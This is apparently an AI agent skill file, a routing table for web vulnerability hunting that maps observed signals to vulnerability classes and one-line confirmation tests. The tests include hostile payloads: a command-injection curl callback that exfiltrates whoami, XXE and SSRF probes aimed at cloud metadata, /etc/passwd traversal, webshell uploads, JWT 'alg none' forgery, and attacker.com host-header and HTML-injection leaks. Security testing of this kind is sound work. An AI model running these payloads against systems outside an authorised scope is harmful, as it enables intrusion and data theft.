---
name: web-router
description: Signal table for web app vuln hunting -- what to try based on what you observe. Load hunt-* reference files for depth once a class looks plausible.
---

# Web Vulnerability Hunting — Router

Scan this table when inspecting any web application endpoint. Match your observable signals (URL paths, parameter names, response headers, behavior) to plausible vulnerability classes, run the one-line confirmation test, and load the indicated reference file for depth.

---

## 1. Access Control & Authorization

| Vulnerability Class | Observable Signals (URL, Params, Headers, Stack) | How to Confirm (Behavioral / Differential Proof) | Reference File |
|---|---|---|---|
| **IDOR** | `id`, `user_id`, `account_id`, `uuid`, `/users/{id}`, `/orders/{id}/download`, GraphQL `node(id:)` | Replay User A's object request with User B's auth token; verify User A's private data returns 200 OK | `references/idor.md` |
| **Auth Bypass (FLAC)** | `/admin`, `/api/internal`, `/management`, path normalization (`/..;/admin`, `/%2e%2e/admin`), proxy headers | Send request unauthenticated or with low-privilege token to administrative path; verify 200 OK action execution | `references/auth-bypass.md` |
| **Business Logic** | `price`, `amount`, `quantity`, `discount`, multi-step checkout, state transitions (`draft` → `paid`) | Submit negative/zero values, skip intermediate workflow steps, or replay single-use promo actions | `references/business-logic.md` |
| **Race Conditions** | Coupon redemption, balance debit/transfer, voucher claims, limit-overrun flows, file upload scan window | Send 20+ concurrent HTTP/2 single-packet requests; verify duplicate redemptions exceed account limit | `references/race-condition.md` |
| **MFA / 2FA Bypass** | `/verify-otp`, `/auth/2fa`, 4/6-digit OTP codes, SMS/TOTP prompts, backup codes | Access post-login endpoints directly, tamper 2FA failure response to `{"success":true}`, or spray unthrottled OTP | `references/mfa-bypass.md` |
| **Password Reset Flaws** | `/forgot-password`, `/reset-password`, reset token queries, token delivery endpoints | Inject `Host: attacker.com` in reset request to verify link reflection, or check token leakage in API responses | `references/forgot-password.md` |
| **Account Takeover (ATO)** | Email change without re-auth, unverified OAuth email linking, predictable tokens, profile mutation | Change victim profile email via IDOR/CSRF or link unverified OAuth account to claim existing profile | `references/ato.md` |
| **Brute Force & Rate Limit** | Login, OTP verify, password reset, voucher inputs, `429 Too Many Requests` responses | Rotate `X-Forwarded-For` or batch requests in JSON arrays/GraphQL; verify repeated attempts succeed | `references/brute-force.md` |
| **CAPTCHA Bypass** | `g-recaptcha-response`, `h-captcha-response`, custom image CAPTCHAs, bot challenge modals | Strip CAPTCHA parameter completely, submit empty/reused token, or switch endpoint to mobile API route | `references/captcha-bypass.md` |

---

## 2. Session & Identity

| Vulnerability Class | Observable Signals (URL, Params, Headers, Stack) | How to Confirm (Behavioral / Differential Proof) | Reference File |
|---|---|---|---|
| **Session Management** | `Set-Cookie`, `PHPSESSID`, `JSESSIONID`, missing `HttpOnly`/`Secure`/`SameSite`, logout/password reset | Verify pre-auth session ID remains valid post-login (fixation), or session remains valid after password change | `references/session.md` |
| **JWT / Crypto Forgery** | `Authorization: Bearer eyJ...`, cookies with 3-part base64 tokens, `"alg": "RS256"`, `"kid"` headers | Set `"alg": "none"` or sign token with server RSA public key as HMAC secret (RS256→HS256); verify server accepts | `references/jwt-crypto.md` |
| **OAuth 2.0 / OIDC** | `/oauth/authorize`, `/oauth/callback`, `redirect_uri`, `response_type=code`, missing `state` param | Poison `redirect_uri` to external domain or strip `state` parameter to verify CSRF login binding | `references/oauth.md` |
| **CSRF** | State-changing `POST`/`PUT`/`DELETE` relying on ambient cookies, missing/static anti-CSRF token | Submit cross-origin HTML form / fetch without custom headers; verify state changes on victim account | `references/csrf.md` |
| **CORS Misconfig** | Private API data, `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials: true` | Send `Origin: https://attacker.com` or `Origin: null`; verify origin reflects with `Allow-Credentials: true` | `references/cors.md` |

---

## 3. Server-Side Injection

| Vulnerability Class | Observable Signals (URL, Params, Headers, Stack) | How to Confirm (Behavioral / Differential Proof) | Reference File |
|---|---|---|---|
| **SQL Injection (SQLi)** | `id`, `search`, `filter`, `sort`, `order_by`, SQL error messages, database-backed queries | Inject `' AND 1=1--` vs `' AND 1=2--` (differential) or sleep payload (e.g. `pg_sleep(5)`) for time delay | `references/sqli.md` |
| **NoSQL Injection** | MongoDB/CouchDB APIs, JSON request bodies `{"username":"admin"}`, query arrays `user[$ne]=1` | Send `{"password": {"$ne": ""}}` or `[$gt]=` in query params; verify unauthenticated login bypass | `references/nosqli.md` |
| **Command Injection (RCE)**| IP/domain tools, PDF/image converters, archive extractors, CLI wrappers, `cmd`, `exec`, `host` | Inject `; sleep 5;` or out-of-band callback (`; curl http://interactsh.com/$(whoami)`) and check delay/DNS | `references/rce.md` |
| **SSTI** | Dynamic email/greeting rendering, template engines (Jinja2, Twig, Freemarker, Velocity, ERB) | Inject `{{7*7}}` or `${7*7}`; verify response renders calculated result `49` instead of raw text | `references/ssti.md` |
| **XXE Injection** | `application/xml`, `text/xml`, SVG uploads, Office docs (DOCX/XLSX), SAML assertions | Send XML with external entity `<!ENTITY xxe SYSTEM "http://interactsh.com">`; verify out-of-band DNS/HTTP ping | `references/xxe.md` |
| **SSRF** | `url`, `target`, `feed`, `webhook`, `preview`, `link`, link preview generators, media proxy | Submit URL pointing to interactsh or `http://169.254.169.254/latest/meta-data/`; verify OOB ping or cloud metadata | `references/ssrf.md` |
| **LFI / Path Traversal** | `file`, `path`, `page`, `template`, `include`, `doc`, document viewers, language switchers | Inject `../../../../etc/passwd` or `php://filter/convert.base64-encode/resource=index.php`; verify file read | `references/lfi.md` |
| **Insecure Deserialization**| Java serialized `rO0AB...`, PHP `O:4:"User":...`, Python pickle, .NET ViewState / BinaryFormatter | Submit serialized gadget triggering time delay (`sleep`) or DNS callback; verify out-of-band hit | `references/deserialization.md` |
| **File Upload Flaws** | Multipart file upload forms, avatar upload, document import, image resizing pipelines | Upload `.php5` / `.phtml` / `.aspx` webshell or SVG with embedded XML/JS; verify direct execution or XSS | `references/file-upload.md` |

---

## 4. Client-Side & UI Injection

| Vulnerability Class | Observable Signals (URL, Params, Headers, Stack) | How to Confirm (Behavioral / Differential Proof) | Reference File |
|---|---|---|---|
| **XSS (Reflected / Stored)**| Reflected query params, user profiles, comments, search fields, support tickets, DOM sinks | Inject `<script>alert(1)</script>` or canary `<img src=x onerror=...>`; verify unescaped script execution | `references/xss.md` |
| **DOM Vulnerabilities** | `location.hash`, `location.search`, `postMessage`, `innerHTML`, `eval`, `Object.assign` | Inject DOM clobbering tags (`<a id="config">`) or prototype pollution query (`?__proto__[x]=1`) to trigger sink | `references/dom.md` |
| **HTML Injection** | Reflected text rendering markup, rich-text support emails, notification banners without script exec | Inject `<form action="http://attacker.com">` or dangling tag `<img src="http://attacker.com/?` to leak page HTML | `references/html-injection.md` |
| **Open Redirect** | `url`, `next`, `redirect`, `return_to`, `dest`, `/login?next=`, `/logout?redirect=` | Pass `https://attacker.com`, `//attacker.com`, or `https://target.com@attacker.com`; verify 302 location | `references/open-redirect.md` |
| **Clickjacking** | Sensitive single-click actions, missing `X-Frame-Options` and `CSP: frame-ancestors` | Embed target URL inside `<iframe>` in local HTML file; verify page renders without frame-busting errors | `references/clickjacking.md` |

---

## 5. Protocol, Transport & Infrastructure

| Vulnerability Class | Observable Signals (URL, Params, Headers, Stack) | How to Confirm (Behavioral / Differential Proof) | Reference File |
|---|---|---|---|
| **Web Cache Poisoning** | `X-Cache: HIT`, `Age: N`, unkeyed headers (`X-Forwarded-Host`, `X-Original-URL`) | Inject unique canary in unkeyed header; verify second unauthenticated request to same URL returns cached canary | `references/cache-poison.md` |
| **HTTP Request Smuggling** | Frontend proxy (Cloudflare/Nginx/AWS) + backend server (Node/Tomcat/IIS), HTTP/1.1 vs HTTP/2 | Send CL.TE / TE.CL differential request; verify subsequent request receives 404 or poisoned prefix response | `references/http-smuggling.md` |
| **Host Header Attacks** | Password reset links, absolute link generators, `Host:`, `X-Forwarded-Host:`, `X-Host:` | Change `Host: attacker.com`; verify links or password reset emails reflect attacker domain | `references/host-header.md` |
| **Exceptional Conditions** | Multi-parser architectures, JSON duplicate keys, unicode normalization, buffer boundary limits | Submit duplicate JSON keys `{"admin":false,"admin":true}` or unicode characters to observe parser mismatch | `references/exceptional-conditions.md` |
| **Misc & Leaks** | `/.git/HEAD`, `/.env`, `phpinfo.php`, `/swagger-ui.html`, stack traces, verbose error outputs | Fetch sensitive paths directly; verify repository metadata, environment variables, or schema disclosure | `references/misc.md` |
| **TLS & Network** | Dangling CNAME records, expired SSL certificates, missing SPF/DMARC policies, open AXFR | Query DNS records (`dig CNAME`, `dig AXFR`); verify unclaimed third-party host or spoofable email domain | `references/tls-network.md` |

---

## 6. Framework & Technology Stack Tells

| Framework / Stack | Observable Signals (Headers, Cookies, Paths, Errors) | How to Confirm (Behavioral / Differential Proof) | Reference File |
|---|---|---|---|
| **ASP.NET / IIS** | `.aspx`, `.ashx`, `__VIEWSTATE`, `ASP.NET_SessionId`, `Server: Microsoft-IIS`, `trace.axd` | Test ViewState MAC enforcement or check `/trace.axd` / `Telerik.Web.UI.WebResource.axd` accessibility | `references/frameworks/aspnet.md` |
| **Laravel (PHP)** | `laravel_session`, `XSRF-TOKEN`, `vendor/laravel`, Ignition debug error page (`_ignition/`) | Access `POST /_ignition/execute-solution` (CVE-2021-3129) or test `.env` exposure for `APP_KEY` cookie forge | `references/frameworks/laravel.md` |
| **Next.js (React)** | `__NEXT_DATA__`, `/_next/static/`, `/_next/image`, `Next-Action` header (Server Actions) | Invoke Server Action ID directly or query `/_next/image?url=http://169.254.169.254` for SSRF | `references/frameworks/nextjs.md` |
| **Node.js / Express** | `X-Powered-By: Express`, `connect.sid`, prototype pollution query parsing, async event loop | Submit `?__proto__[polluted]=true` or trigger template injection (`<%- 7*7 %>` in EJS) | `references/frameworks/nodejs.md` |
| **Spring Boot (Java)** | Whitelabel Error Page (hash `116323821`), `/actuator`, `/actuator/env`, `/actuator/heapdump` | Access `/actuator/env` or `/actuator/heapdump`; verify environment variable or memory dump leakage | `references/frameworks/springboot.md` |
| **Microsoft SharePoint** | `/_layouts/15/`, `/_vti_bin/`, `MicrosoftSharePointTeamServices`, `ToolPane.aspx` | Test `ToolPane.aspx` ViewState deserialization or query `/_vti_bin/ListData.svc` for unauth list schemas | `references/frameworks/sharepoint.md` |
